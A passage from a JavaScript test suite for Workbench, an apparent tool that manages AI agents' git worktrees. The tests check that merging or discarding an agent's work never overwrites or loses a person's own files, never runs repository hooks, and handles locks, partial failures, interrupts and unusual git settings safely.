    assert.equal(fs.readFileSync(p('cache'), 'utf8'), 'an agent file where the person has a folder\n');
  });

  test('a file the person deleted or renamed without staging it never comes back with the agent’s version: blocked', async () => {
    // The danger is real: git's fast-forward writes over a tracked file that is missing, as if it were unchanged.
    const d = await agentRepo();
    write(d.w('a.txt'), 'one\nAGENT\nthree\n');
    git(d.ws.path, 'commit', '-q', '-am', 'agent');
    const demo = cloneOf(d.root);
    fs.rmSync(path.join(demo, 'a.txt'));
    assert.equal(gitTry(demo, 'merge', '--ff-only', '-q', `origin/${d.ws.branch}`).code, 0);
    assert.equal(fs.readFileSync(path.join(demo, 'a.txt'), 'utf8'), 'one\nAGENT\nthree\n');
    assert.equal(statusOf(demo), '', 'the deletion is gone, without a word');

    const files = { ...STARTING_FILES, 'docs/x.md': 'x\n', 'docs/y.md': 'y\n' };
    const blocked = (label, setup, paths, agent = t => write(t.w('a.txt'), 'one\nAGENT\nthree\n')) => async () => {
      const t = await agentRepo(files);
      agent(t);
      setup(t);
      const before = { person: folderPrint(t.root), status: statusOf(t.root), head: headOf(t.root) };
      const { expect } = await proposal(t);
      assert.deepEqual(await mergeWork(mergeOpts(t, expect)), {
        ok: false, why: 'blocked', paths, sentence: `Your own changes are in the way: ${paths.join(', ')}. Commit or put them aside, then merge again.`,
      }, label);
      assert.deepEqual({ person: folderPrint(t.root), status: statusOf(t.root), head: headOf(t.root) }, before, `${label}: nothing in the person’s folder changed`);
      return t;
    };
    await inParallel([
      async () => {
        const t = await blocked('deleted', t => fs.rmSync(t.p('a.txt')), ['a.txt'])();
        // Once the file is back, the merge goes through.
        git(t.root, 'checkout', '--', 'a.txt');
        assert.equal((await mergeWork(mergeOpts(t, (await proposal(t)).expect))).ok, true);
        assert.equal(fs.readFileSync(t.p('a.txt'), 'utf8'), 'one\nAGENT\nthree\n');
      },
      blocked('renamed, with an edit', t => {
        fs.renameSync(t.p('a.txt'), t.p('renamed.txt'));
        write(t.p('renamed.txt'), 'one\ntwo\nthree\nmine\n');
      }, ['a.txt']),
      blocked('a deleted folder', t => fs.rmSync(t.p('docs'), { recursive: true }), ['docs/x.md'], t => write(t.w('docs/x.md'), 'x by the agent\n')),
      // A file the agent deletes too, or does not touch, stays deleted, and the merge goes through.
      async () => {
        const t = await agentRepo(files);
        write(t.w('a.txt'), 'one\nAGENT\nthree\n');
        fs.rmSync(t.w('b.txt'));
        fs.rmSync(t.p('b.txt'));
        fs.rmSync(t.p('c.txt'));
        const r = await mergeWork(mergeOpts(t, (await proposal(t)).expect));
        assert.equal(r.ok, true, JSON.stringify(r));
        assert.equal(fs.existsSync(t.p('b.txt')), false);
        assert.equal(fs.existsSync(t.p('c.txt')), false);
        assert.equal(statusOf(t.root), ' D c.txt\n');
      },
    ]);
  });

  test('blocked names at most three paths', async () => {
    const t = await agentRepo();
    for (const f of ['n1', 'n2', 'n3', 'n4', 'n5']) {
      write(t.w(f), 'agent\n');
      write(t.p(f), 'mine\n');
    }
    const { expect } = await proposal(t);
    const r = await mergeWork(mergeOpts(t, expect));
    assert.deepEqual(r, {
      ok: false, why: 'blocked', paths: ['n1', 'n2', 'n3', 'n4', 'n5'],
      sentence: 'Your own changes are in the way: n1, n2, n3 and 2 more. Commit or put them aside, then merge again.',
    });
  });

  test('an ignored .env in the person’s folder survives a merge that brings in a .env: it is refused as blocked', async () => {
    const t = await agentRepo(); // .env is in .gitignore
    write(t.w('.env'), 'SECRET=agent\n');
    git(t.ws.path, 'add', '-f', '.env');
    git(t.ws.path, 'commit', '-q', '-m', 'the agent commits a .env');
    write(t.p('.env'), 'SECRET=person\n');

    // The danger is real: a plain fast-forward overwrites an ignored file without a word.
    const demo = cloneOf(t.root);
    write(path.join(demo, '.env'), 'SECRET=person\n');
    assert.equal(gitTry(demo, 'check-ignore', '-q', '.env').code, 0);
    assert.equal(gitTry(demo, 'merge', '--ff-only', '-q', `origin/${t.ws.branch}`).code, 0);
    assert.equal(fs.readFileSync(path.join(demo, '.env'), 'utf8'), 'SECRET=agent\n');

    // Workbench's merge is refused instead, and the person's .env is untouched.
    const person = folderPrint(t.root);
    const { expect } = await proposal(t);
    assert.deepEqual(await mergeWork(mergeOpts(t, expect)), {
      ok: false, why: 'blocked', paths: ['.env'],
      sentence: 'Your own changes are in the way: .env. Commit or put them aside, then merge again.',
    });
    assert.equal(fs.readFileSync(t.p('.env'), 'utf8'), 'SECRET=person\n');
    assert.deepEqual(folderPrint(t.root), person);
  });

  test('merge.autoStash in the person’s config changes nothing: no stash, no conflict markers', async () => {
    const t = await agentRepo();
    write(t.w('a.txt'), 'one\nAGENT\nthree\n');
    git(t.ws.path, 'commit', '-q', '-am', 'agent');

    // The danger is real: with merge.autoStash, a plain fast-forward stashes the edit, then leaves conflict markers.
    const demo = cloneOf(t.root);
    write(path.join(demo, 'a.txt'), 'one\nMINE\nthree\n');
    gitTry(demo, '-c', 'merge.autoStash=true', 'merge', '--ff-only', '-q', `origin/${t.ws.branch}`);
    assert.match(fs.readFileSync(path.join(demo, 'a.txt'), 'utf8'), /^<<<<<<< /m);
    assert.notEqual(git(demo, 'stash', 'list'), '');

    git(t.root, 'config', 'merge.autoStash', 'true');
    write(t.p('a.txt'), 'one\nMINE\nthree\n');
    const person = folderPrint(t.root);
    let { expect } = await proposal(t);
    assert.deepEqual(await mergeWork(mergeOpts(t, expect)), {
      ok: false, why: 'blocked', paths: ['a.txt'],
      sentence: 'Your own changes are in the way: a.txt. Commit or put them aside, then merge again.',
    });
    assert.deepEqual(folderPrint(t.root), person);
    assert.equal(fs.readFileSync(t.p('a.txt'), 'utf8'), 'one\nMINE\nthree\n');
    assert.equal(git(t.root, 'stash', 'list'), '');
    // An edit the merge does not touch: merged, the edit kept, still no stash.
    git(t.root, 'checkout', '--', 'a.txt');
    write(t.p('c.txt'), 'mine\n');
    ({ expect } = await proposal(t));
    assert.equal((await mergeWork(mergeOpts(t, expect))).ok, true);
    assert.equal(fs.readFileSync(t.p('c.txt'), 'utf8'), 'mine\n');
    assert.equal(fs.readFileSync(t.p('a.txt'), 'utf8'), 'one\nAGENT\nthree\n');
    assert.equal(git(t.root, 'stash', 'list'), '');
  });

  test('branch.<name>.mergeOptions=--squash in the person’s config changes nothing: the merge goes through, and no squash is left', async () => {
    const t = await agentRepo();
    write(t.w('a.txt'), 'one\nAGENT\nthree\n');
    write(t.w('new.txt'), 'new\n');
    git(t.ws.path, 'add', '-A');
    git(t.ws.path, 'commit', '-q', '-m', 'agent');

    // The danger is real: with that setting, a plain fast-forward writes and stages the files, and the branch stays.
    const demo = cloneOf(t.root);
    git(demo, 'config', 'branch.main.mergeOptions', '--squash');
    const was = headOf(demo);
    assert.equal(gitTry(demo, 'merge', '--ff-only', '-q', `origin/${t.ws.branch}`).code, 0);
    assert.equal(headOf(demo), was);
    assert.equal(statusOf(demo), 'M  a.txt\nA  new.txt\n');
    assert.equal(fs.existsSync(path.join(demo, '.git', 'SQUASH_MSG')), true);

    git(t.root, 'config', 'branch.main.mergeOptions', '--squash');
    const { expect } = await proposal(t);
    const r = await mergeWork(mergeOpts(t, expect));
    assert.equal(r.ok, true, JSON.stringify(r));
    assert.equal(headOf(t.root), r.merge);
    assert.equal(git(t.root, 'log', '-1', '--format=%P', r.merge), `${t.ws.base} ${r.work}`);
    assert.equal(statusOf(t.root), '');
    assert.equal(fs.existsSync(path.join(t.root, '.git', 'SQUASH_MSG')), false);
    assert.equal(fs.readFileSync(t.p('new.txt'), 'utf8'), 'new\n');
  });

  test('the repository’s hooks never run: not for the snapshot, the diff, the merge, the throw-away or the graph', async () => {
    const t = await agentRepo();
    write(t.w('a.txt'), 'one\nAGENT\nthree\n');
    git(t.ws.path, 'commit', '-q', '-am', 'agent'); // committed before the hooks are planted (pre-commit says no)
    write(t.w('new.txt'), 'new\n'); // and something uncommitted, so the merge makes a commit of its own
    const other = await createWorkspace({ repoRoot: t.root, agentId: 'hk0002', slug: 'Throw me', baseDir });
    write(path.join(other.path, 'x.txt'), 'x\n');
    const log = path.join(T, `hooks-${t.id}.log`);
    plantHooks(path.join(t.root, '.git'), log);
    plantConfigHooks(path.join(t.root, '.git', 'config'), log);
    // And in the agent's own config, where this git reads one (config.worktree).
    git(t.root, 'config', 'extensions.worktreeConfig', 'true');
    plantConfigHooks(path.resolve(t.ws.path, git(t.ws.path, 'rev-parse', '--git-path', 'config.worktree')), log, 'agent');
    const agentHooksSeen = gitTry(t.ws.path, 'config', '--get', 'hook.agent.post-merge=x.event').out.trim() === 'post-merge';

    // The danger is real: plain git runs them.
    const demo = cloneOf(t.root);
    plantHooks(path.join(demo, '.git'), log);
    plantConfigHooks(path.join(demo, '.git', 'config'), log);
    assert.equal(gitTry(demo, 'merge', '--ff-only', '-q', `origin/${t.ws.branch}`).code, 0);
    assert.ok(ranHooks(log).includes('post-merge'));
    assert.ok(ranHooks(log).includes('reference-transaction'));
    assert.notEqual(gitTry(demo, 'commit', '-q', '--allow-empty', '-m', 'x').code, 0, 'pre-commit said no');
    assert.ok(ranHooks(log).includes('pre-commit'));
    const configHooksRun = ranHooks(log).includes('config-post-merge'); // git 2.54 and newer
    fs.rmSync(log);
    if (configHooksRun) {
      // ...and an empty core.hooksPath, which stops the hooks in the hooks folder, does not stop those set in config.
      const demo2 = cloneOf(t.root);
      plantConfigHooks(path.join(demo2, '.git', 'config'), log);
      const empty = fs.mkdtempSync(path.join(T, 'empty-hooks-'));
      assert.equal(gitTry(demo2, '-c', `core.hooksPath=${empty}`, 'merge', '--ff-only', '-q', `origin/${t.ws.branch}`).code, 0);
      assert.ok(ranHooks(log).includes('config-post-merge'));
      fs.rmSync(log);
    }

    const s = await snapshotWork({ repoRoot: t.root, path: t.ws.path, since: t.ws.base });
    await workDiff({ repoRoot: t.root, path: t.ws.path, since: t.ws.base });
    const info = await prepareRepo(t.root);
    const r = await mergeWork(mergeOpts(t, { workId: s.workId, into: info.branch, intoHead: info.head }));
    assert.equal(r.ok, true);
    assert.equal(git(t.root, 'log', '-1', '--format=%P', r.work), s.head, 'a commit of its own was made');
    const s2 = await snapshotWork({ repoRoot: t.root, path: other.path, since: other.base });
    assert.equal((await discardWork({ repoRoot: t.root, path: other.path, branch: other.branch, since: other.base, expect: { workId: s2.workId }, agentId: 'hk0002' })).ok, true);
    assert.equal((await gitGraph({ repoRoot: t.root })).ok, true);
    assert.deepEqual(ranHooks(log), [], 'no hook ran');
    // The agent's own hooks would have run in its folder (the snapshot and the reset after its work commit write an
    // index there), had they not been off: plain git runs them.
    if (configHooksRun && agentHooksSeen) {
      write(t.w('later.txt'), 'later\n');
      git(t.ws.path, 'add', '-A');
      assert.ok(ranHooks(log).includes('agent-post-index-change'));
    }
  });

  test('mergeWork waits a little for another git command in the person’s folder, then says so', async () => {
    // The index held (git stops before it changes anything), or the branch held (git would update the files first, and
    // then fail to move the branch): Workbench waits a little, then says so, and nothing in the folder has changed.
    for (const held of ['index.lock', 'refs/heads/main.lock']) {
      const t = await agentRepo();
      write(t.w('a.txt'), 'one\nAGENT\nthree\n');
      write(t.w('new.txt'), 'new\n');
      const lock = path.join(t.root, '.git', held);
      write(lock, '');
      let { expect } = await proposal(t);
      const was = await everything(t);
      assert.deepEqual(await mergeWork(mergeOpts(t, expect)), { ok: false, why: 'busy', sentence: 'Another git command is busy in your folder. Try again in a moment.' }, held);
      const now = await everything(t);
      assert.deepEqual([now.person, now.personStatus, now.head, now.on], [was.person, was.personStatus, was.head, was.on], held);
      // Let go while it waits: it goes through.
      ({ expect } = await proposal(t));
      setTimeout(() => fs.rmSync(lock), 150);
      const ok = await mergeWork(mergeOpts(t, expect));
      assert.equal(ok.ok, true, held);
      assert.equal(fs.readFileSync(t.p('a.txt'), 'utf8'), 'one\nAGENT\nthree\n');
      assert.equal(statusOf(t.root), '');
    }
  });

  test('when git stops half-way through the fast-forward, mergeWork never says nothing changed, and merging again finishes it', async (c) => {
    if (process.getuid?.() === 0) return c.skip('as root, a folder without write permission does not stop git');
    const t = await agentRepo();
    write(t.w('a.txt'), 'one\nAGENT\nthree\n');
    write(t.w('new.txt'), 'new\n');
    let { expect } = await proposal(t);
    // Git can write the files but not the branch: it updates the folder, then stops.
    const heads = path.join(t.root, '.git', 'refs', 'heads');
    fs.chmodSync(heads, 0o555);
    let r;
    try {
      r = await mergeWork(mergeOpts(t, expect));
    } finally {
      fs.chmodSync(heads, 0o755);
    }
    assert.deepEqual(r, { ok: false, why: 'git', sentence: 'Git could not finish the merge into main. Have a look at your folder before you try again.' });
    assert.equal(headOf(t.root), t.ws.base);
    assert.equal(statusOf(t.root), 'M  a.txt\nA  new.txt\n', 'the merge’s files are in the folder, staged');
    ({ expect } = await proposal(t));
    const ok = await mergeWork(mergeOpts(t, expect));
    assert.equal(ok.ok, true);
    assert.equal(headOf(t.root), ok.merge);
    assert.equal(statusOf(t.root), '');
  });

  test('when a write fails part-way through the fast-forward, the files git left are never called the person’s own changes', async () => {
    const t = await agentRepo();
    const pages = Array.from({ length: 6 }, (_, i) => `page${i}.txt`);
    for (const f of pages) write(t.w(f), `${f} by the agent\n`);
    write(t.w('a.txt'), 'one\nAGENT\nthree\n');
    write(t.w('b.txt'), 'b by the agent\n');
    // The person's own required filter (as Git LFS sets one up), which fails on one file while they are offline.
    const offline = path.join(T, `offline-${t.id}`);
    write(offline, '');
    git(t.root, 'config', 'filter.lfsish.smudge', `sh -c 'if [ "$0" = page3.txt ] && [ -e '"'"'${offline}'"'"' ]; then exit 1; fi; cat' %f`);
    git(t.root, 'config', 'filter.lfsish.clean', 'cat');
    git(t.root, 'config', 'filter.lfsish.required', 'true');
    write(path.join(t.root, '.git', 'info', 'attributes'), 'page*.txt filter=lfsish\n');
    let { expect } = await proposal(t);
    assert.deepEqual(await mergeWork(mergeOpts(t, expect)),
      { ok: false, why: 'git', sentence: 'Git could not finish the merge into main. Have a look at your folder before you try again.' });
    assert.equal(headOf(t.root), t.ws.base);
    // Git wrote some of the merge's files, then put its index back: they look like the person's own changes.
    const left = statusOf(t.root).split('\n').filter(Boolean).map(l => l.slice(3));
    assert.ok(left.includes('a.txt') && left.includes('b.txt') && left.includes('page0.txt') && !left.includes('page3.txt'), statusOf(t.root));

    // Back online. Meanwhile the person changes b.txt: only that one is theirs.
    fs.rmSync(offline);
    write(t.p('b.txt'), 'mine\n');
    ({ expect } = await proposal(t));
    assert.deepEqual(await mergeWork(mergeOpts(t, expect)),
      { ok: false, why: 'blocked', paths: ['b.txt'], sentence: 'Your own changes are in the way: b.txt. Commit or put them aside, then merge again.' });
    // Without it, the rest are named for what they are.
    git(t.root, 'checkout', '--', 'b.txt');
    ({ expect } = await proposal(t));
    const again = await mergeWork(mergeOpts(t, expect));
    const leftovers = left.filter(p => p !== 'b.txt');
    assert.deepEqual([...(again.paths || [])].sort(), [...leftovers].sort(), JSON.stringify(again));
    const named = again.paths.length > 3 ? `${again.paths.slice(0, 3).join(', ')} and ${again.paths.length - 3} more` : again.paths.join(', ');
    assert.deepEqual(again, {
      ok: false, why: 'git', paths: again.paths,
      sentence: `Files in your folder already hold what the merge brings in, and git will not write over them: ${named}. Undo those changes, then merge again.`,
    });
    // Undone, the merge goes through.
    git(t.root, 'checkout', '--', 'a.txt');
    for (const f of leftovers) if (f.startsWith('page')) fs.rmSync(t.p(f));
    ({ expect } = await proposal(t));
    const ok = await mergeWork(mergeOpts(t, expect));
    assert.equal(ok.ok, true, JSON.stringify(ok));
    assert.equal(statusOf(t.root), '');
    for (const f of pages) assert.equal(fs.readFileSync(t.p(f), 'utf8'), `${f} by the agent\n`);
    assert.equal(fs.readFileSync(t.p('b.txt'), 'utf8'), 'b by the agent\n');
  });

  test('a file in the way is judged by its own bytes, whatever its name: one that starts with a quote is never read as another', async () => {
    const t = await agentRepo();
    write(t.w('"x"'), 'agent\n');
    write(t.p('"x"'), 'mine\n'); // the person's own file, in the way
    write(t.p('x'), 'agent\n'); // and x, which holds what the agent's "x" holds (git reads the line "x" as x)
    const { expect } = await proposal(t);
    assert.deepEqual(await mergeWork(mergeOpts(t, expect)), {
      ok: false, why: 'blocked', paths: ['"x"'], sentence: 'Your own changes are in the way: "x". Commit or put them aside, then merge again.',
    });
  });

  test('when the person’s branch moves while git writes their files, mergeWork says the merge did not finish, never that it moved', async () => {
    const t = await agentRepo();
    write(t.p('c.txt'), 'c by the person\n');
    git(t.root, 'commit', '-q', '-am', 'person');
    write(t.w('a.txt'), 'one\nAGENT\nthree\n');
    write(t.w('page.txt'), 'page\n');
    // While git writes the agent's page.txt, the person undoes their last commit and keeps its changes (an IDE's "Undo
    // commit"): a command that moves only the branch, which the index lock git holds does not keep out. The person's
    // own smudge filter does it here, once, so that it lands in that moment every time.
    const flag = path.join(T, `undo-${t.id}`);
    git(t.root, 'config', 'filter.undo.smudge', `if [ ! -e '${flag}' ]; then : > '${flag}'; git reset -q --soft HEAD~1 >/dev/null 2>&1; fi; cat`);
    git(t.root, 'config', 'filter.undo.clean', 'cat');
    write(path.join(t.root, '.git', 'info', 'attributes'), 'page.txt filter=undo\n');
    const { expect } = await proposal(t);
    const r = await mergeWork(mergeOpts(t, expect));
    assert.ok(fs.existsSync(flag), 'the filter ran');
    assert.deepEqual(r, { ok: false, why: 'git', sentence: 'Git could not finish the merge into main. Have a look at your folder before you try again.' });
    // "main changed since you looked" would not be the whole truth: the agent's files are in the folder, staged.
    assert.equal(headOf(t.root), t.ws.base);
    assert.equal(statusOf(t.root), 'M  a.txt\nM  c.txt\nA  page.txt\n');
  });

  test('a Ctrl-C in the terminal while the fast-forward writes the person’s files reaches only Workbench: git finishes the merge', async (c) => {
    if (process.platform === 'win32') return c.skip('a terminal’s process groups are a Unix matter');
    const t = await agentRepo();
    const pages = Array.from({ length: 15 }, (_, i) => `page${String(i).padStart(2, '0')}.txt`);
    for (const f of pages) write(t.w(f), `${f}\n`);
    // A slow smudge filter on the person's text files, standing in for Git LFS: each file takes a moment to write.
    git(t.root, 'config', 'filter.slow.smudge', 'sleep 0.1; cat');
    git(t.root, 'config', 'filter.slow.clean', 'cat');
    write(path.join(t.root, '.git', 'info', 'attributes'), '*.txt filter=slow\n');
    const { expect } = await proposal(t);

    // Workbench in a process of its own, as in a terminal: on Ctrl-C it waits for the merge under way, as shutdown does.
    const script = path.join(T, `ctrl-c-${t.id}.mjs`);
    write(script, [
      `import { mergeWork } from ${JSON.stringify(new URL('../src/core/workspace.mjs', import.meta.url).href)};`,
      'let interrupted = false;',
      'process.on(\'SIGINT\', () => { interrupted = true; });',
      'const result = await mergeWork(JSON.parse(process.env.WB_MERGE));',
      'process.stdout.write(JSON.stringify({ result, interrupted }));',
    ].join('\n'));
    const child = spawn(process.execPath, [script], {
      detached: true, stdio: ['ignore', 'pipe', 'pipe'], env: { ...process.env, WB_MERGE: JSON.stringify(mergeOpts(t, expect)) },
    });
    let out = '';
    let err = '';
    child.stdout.on('data', d => { out += d; });
    child.stderr.on('data', d => { err += d; });
    let ended = false;
    const closed = new Promise(resolve => child.on('close', () => { ended = true; resolve(); }));
    let timer;
    try {
      // The terminal sends SIGINT to the whole foreground process group, once git has begun writing the merged files.
      const began = Date.now();
      while (!fs.existsSync(t.p(pages[0]))) {
        assert.ok(!ended && Date.now() - began < 60_000, `the merge never began writing files: ${out}${err}`);
        await new Promise(resolve => setTimeout(resolve, 5));
      }
      process.kill(-child.pid, 'SIGINT');
      await Promise.race([closed, new Promise((resolve, reject) => {
        timer = setTimeout(() => reject(new Error(`the merge did not end: ${out}${err}`)), 60_000);
      })]);
    } finally {
      clearTimeout(timer);
      if (!ended) { // a failed check: stop the child, and wait for it, so nothing of it outlives the test
        try { process.kill(-child.pid, 'SIGKILL'); } catch {}
        await closed;
      }
    }
    const { result, interrupted } = JSON.parse(out || '{}');
    assert.equal(interrupted, true, err);
    assert.equal(result.ok, true, JSON.stringify(result));
    assert.equal(headOf(t.root), result.merge);
    assert.equal(statusOf(t.root), '');
    for (const f of pages) assert.equal(fs.readFileSync(t.p(f), 'utf8'), `${f}\n`);
  });

  test('discardWork keeps a hidden copy of the work, then deletes the folder and the branch; only for the work that was shown', async () => {
    const t = await agentRepo();
    const { w } = t;
    write(w('d.txt'), 'd\n');
    git(t.ws.path, 'add', 'd.txt');
    git(t.ws.path, 'commit', '-q', '-m', 'agent commit');
    write(w('a.txt'), 'not committed\n');
    write(w('new.txt'), 'new\n');
    const head = headOf(t.ws.path);
    const s = await snapshotWork({ repoRoot: t.root, path: t.ws.path, since: t.ws.base });
    const opts = { repoRoot: t.root, path: t.ws.path, branch: t.ws.branch, since: t.ws.base, expect: { workId: s.workId }, agentId: t.id };

    // What was shown is not what is there: refused, nothing deleted.
    write(w('late.txt'), 'late\n');
    const was = await everything(t);
    assert.deepEqual(await discardWork(opts), { ok: false, why: 'changed', sentence: 'Its work changed since you looked. Have another look.' });
    assert.deepEqual(await everything(t), was);
    fs.rmSync(w('late.txt'));

    assert.deepEqual(await discardWork(opts), { ok: true, saved: `refs/workbench/discarded/${t.id}` });
    assert.equal(fs.existsSync(t.ws.path), false);
    assert.equal(git(t.root, 'branch', '--list', t.ws.branch), '');
    assert.ok(!git(t.root, 'worktree', 'list', '--porcelain').includes(t.ws.path));
    // The hidden copy holds all of the work, the uncommitted part too, on top of the agent's own commit.
    const saved = git(t.root, 'rev-parse', `refs/workbench/discarded/${t.id}`);
    assert.equal(git(t.root, 'rev-parse', `${saved}^{tree}`), s.tree);
    assert.equal(git(t.root, 'log', '-1', '--format=%P', saved), head);
    assert.equal(git(t.root, 'show', `${saved}:a.txt`), 'not committed');
    assert.equal(git(t.root, 'log', '-1', '--format=%an <%ae>', saved), 'Pat Person <pat@example.invalid>');
    assert.match(git(t.root, 'reflog', 'show', `refs/workbench/discarded/${t.id}`), /workbench: threw away workbench\/search-cleanup-/);
    // Hidden: not a branch, not in the graph.
    assert.ok(!git(t.root, 'branch', '--list', '--all').includes('discarded'));
    assert.ok(!(await gitGraph({ repoRoot: t.root })).commits.some(c => c.id === saved));
    // Again: there is nothing left to throw away.
    assert.deepEqual(await discardWork(opts), { ok: false, why: 'gone', sentence: 'Its folder and its branch are already gone.' });
    // The person's own folder is never one.
    assert.equal((await discardWork({ ...opts, path: t.root })).ok, false);
    assert.ok(fs.existsSync(t.p('a.txt')));
  });

  test('discardWork handles a locked folder, a folder already gone, a branch that moved and one checked out elsewhere', async () => {
    const t = await agentRepo(STARTING_FILES, { identity: false }); // no name and email: the hidden copy is Workbench's own
    const mk = async (id, slug) => {
      const ws = await createWorkspace({ repoRoot: t.root, agentId: id, slug, baseDir });
      write(path.join(ws.path, 'a.txt'), `${id}\n`);
      return ws;
    };
    const discard = (ws, id, workId) => discardWork({ repoRoot: t.root, path: ws.path, branch: ws.branch, since: ws.base, expect: { workId }, agentId: id });

    // Locked: a single --force is not enough for git; Workbench uses two.
    const locked = await mk('lk0001', 'locked');
    git(t.root, 'worktree', 'lock', '--reason', 'testing', locked.path);
    assert.notEqual(gitTry(t.root, 'worktree', 'remove', '--force', locked.path).code, 0);
    const s = await snapshotWork({ repoRoot: t.root, path: locked.path, since: locked.base });
    assert.deepEqual(await discard(locked, 'lk0001', s.workId), { ok: true, saved: 'refs/workbench/discarded/lk0001' });
    assert.equal(fs.existsSync(locked.path), false);
    assert.equal(git(t.root, 'branch', '--list', locked.branch), '');
    assert.equal(git(t.root, 'log', '-1', '--format=%an <%ae>', 'refs/workbench/discarded/lk0001'), 'Workbench <workbench@localhost>');
    assert.equal(git(t.root, 'show', 'refs/workbench/discarded/lk0001:a.txt'), 'lk0001');

    // The folder was deleted by hand: the branch still goes, and its last commit is kept.
    const gone = await mk('gn0001', 'gone');
    git(gone.path, 'commit', '-q', '-am', 'agent');
    const tip = headOf(gone.path);
    fs.rmSync(gone.path, { recursive: true, force: true });
    assert.deepEqual(await discard(gone, 'gn0001', null), { ok: true, saved: 'refs/workbench/discarded/gn0001' });
    assert.equal(git(t.root, 'branch', '--list', gone.branch), '');
    assert.equal(git(t.root, 'rev-parse', 'refs/workbench/discarded/gn0001'), tip);
    assert.ok(!git(t.root, 'worktree', 'list', '--porcelain').includes(gone.path));

    // Folder gone and the branch moved since the card was drawn: kept.
    const moved = await mk('mv0001', 'moved');
    git(moved.path, 'commit', '-q', '-am', 'agent');
    const shown = `${headOf(moved.path)}:${git(moved.path, 'rev-parse', 'HEAD^{tree}')}`;
    fs.rmSync(moved.path, { recursive: true, force: true });
    git(t.root, 'update-ref', `refs/heads/${moved.branch}`, moved.base);
    assert.deepEqual(await discard(moved, 'mv0001', shown), { ok: false, why: 'changed', sentence: 'Its work changed since you looked. Have another look.' });
    assert.equal(git(t.root, 'rev-parse', `refs/heads/${moved.branch}`), moved.base);
    assert.equal(gitTry(t.root, 'rev-parse', '-q', '--verify', 'refs/workbench/discarded/mv0001').code, 1);

    // Folder gone, but the branch is checked out in another folder now: left alone.
    const taken = await mk('tk0001', 'taken');
    fs.rmSync(taken.path, { recursive: true, force: true });
    git(t.root, 'worktree', 'prune');
    const elsewhere = path.join(T, 'elsewhere');
    git(t.root, 'worktree', 'add', '-q', elsewhere, taken.branch);
    assert.deepEqual(await discard(taken, 'tk0001', null),
      { ok: false, why: 'git', sentence: `Its branch ${taken.branch} is checked out in another folder, so Workbench left it alone.` });
    assert.ok(fs.existsSync(elsewhere));
    assert.notEqual(git(t.root, 'branch', '--list', taken.branch), '');
    git(t.root, 'worktree', 'remove', '--force', elsewhere);
  });

  test('throwing away or removing an agent’s folder that is gone never touches the person’s own worktrees, even one whose folder is away', async () => {
    const t = await agentRepo();
    // The person's own worktree, with a staged change, on a disk that is not there right now.
    const mine = path.join(fs.realpathSync.native(T), `mine-${t.id}`);
    git(t.root, 'worktree', 'add', '-q', '-b', `mine-${t.id}`, mine);
    write(path.join(mine, 'staged.txt'), 'staged\n');
    git(mine, 'add', 'staged.txt');
    fs.renameSync(mine, `${mine}-away`);
    const listed = () => git(t.root, 'worktree', 'list', '--porcelain').split('\n').filter(l => l.startsWith('worktree ')).map(l => l.slice(9));
    assert.ok(listed().includes(mine));
    // The danger is real: `git worktree prune` would take its records away, for good.
    const pruned = gitTry(t.root, 'worktree', 'prune', '--dry-run', '--verbose');
    assert.match(pruned.out + pruned.err, new RegExp(`mine-${t.id}`));

    // An agent's folder deleted by hand, then thrown away; then a locked one.
    write(t.w('a.txt'), 'agent\n');
    git(t.ws.path, 'commit', '-q', '-am', 'agent');
    fs.rmSync(t.ws.path, { recursive: true, force: true });
    const discard = (ws, id) => discardWork({ repoRoot: t.root, path: ws.path, branch: ws.branch, since: ws.base, expect: { workId: null }, agentId: id });
    assert.deepEqual(await discard(t.ws, t.id), { ok: true, saved: `refs/workbench/discarded/${t.id}` });
    assert.ok(!listed().includes(t.ws.path));
    assert.ok(listed().includes(mine), 'the person’s worktree is still there');
    const locked = await createWorkspace({ repoRoot: t.root, agentId: 'pr0002', slug: 'Locked away', baseDir });
    git(t.root, 'worktree', 'lock', locked.path);
    fs.rmSync(locked.path, { recursive: true, force: true });
    assert.deepEqual(await discard(locked, 'pr0002'), { ok: true, saved: 'refs/workbench/discarded/pr0002' });
    assert.ok(!listed().includes(locked.path));
    assert.equal(git(t.root, 'branch', '--list', locked.branch), '');
    assert.ok(listed().includes(mine), 'the person’s worktree is still there');
    // Something that is not its folder is at its folder's path: left alone, and so is its branch.
    const odd = await createWorkspace({ repoRoot: t.root, agentId: 'pr0004', slug: 'Not a folder', baseDir });
    fs.rmSync(odd.path, { recursive: true, force: true });
    write(odd.path, 'a file of the person’s\n');
    assert.deepEqual(await discard(odd, 'pr0004'),
      { ok: false, why: 'git', sentence: `Workbench cannot read its folder ${odd.path}, so it left the folder and its branch alone.` });
    assert.equal(fs.readFileSync(odd.path, 'utf8'), 'a file of the person’s\n');
    assert.ok(listed().includes(odd.path));
    assert.notEqual(git(t.root, 'branch', '--list', odd.branch), '');
    assert.equal(gitTry(t.root, 'rev-parse', '-q', '--verify', 'refs/workbench/discarded/pr0004').code, 1);
    fs.rmSync(odd.path);

    // The tidy asked about a folder git does not list, and a removal git refuses (a locked folder that is gone).
    assert.deepEqual(await removeWorkspace({ repoRoot: t.root, path: path.join(T, 'never-a-worktree'), base: t.ws.base, onlyIfUnchanged: true, deleteBranch: true }),
      { removed: false });
    const other = await createWorkspace({ repoRoot: t.root, agentId: 'pr0003', slug: 'Locked too', baseDir });
    git(t.root, 'worktree', 'lock', other.path);
    fs.rmSync(other.path, { recursive: true, force: true });
    await removeWorkspace({ repoRoot: t.root, path: other.path, deleteBranch: true });
    assert.ok(listed().includes(mine), 'the person’s worktree is still there');

    // Back from the disk: it is still a worktree of theirs, with its staged change.
    fs.renameSync(`${mine}-away`, mine);
    assert.equal(statusOf(mine), 'A  staged.txt\n');
  });

  test('gitGraph lists HEAD and the agents’ branches newest first, with agentId and kind from the trailers only', async () => {
    const t = await agentRepo();
    write(t.w('a.txt'), 'one\nTWO\nthree\n');
    const { expect } = await proposal(t);
    const m = await mergeWork(mergeOpts(t, expect));
    assert.equal(m.ok, true);
    const second = await createWorkspace({ repoRoot: t.root, agentId: 'gr0002', slug: 'Graph second', baseDir });
    write(path.join(second.path, 'x.txt'), 'x\n');
    git(second.path, 'add', 'x.txt');
    git(second.path, 'commit', '-q', '-m', 'Second agent’s own commit');
    const secondTip = headOf(second.path);
    // Decoys: a subject that reads like Workbench's words, and a merge trailer on a commit with one parent.
    write(t.p('e.txt'), 'e\n');
    git(t.root, 'add', 'e.txt');
    git(t.root, 'commit', '-q', '-m', `Merge Someone: Workbench-Agent: zz9999`, '-m', 'Workbench-Kind: merge');
    const decoy = headOf(t.root);
    const rlo = String.fromCharCode(0x202e);
    write(t.p('f.txt'), 'f\n');
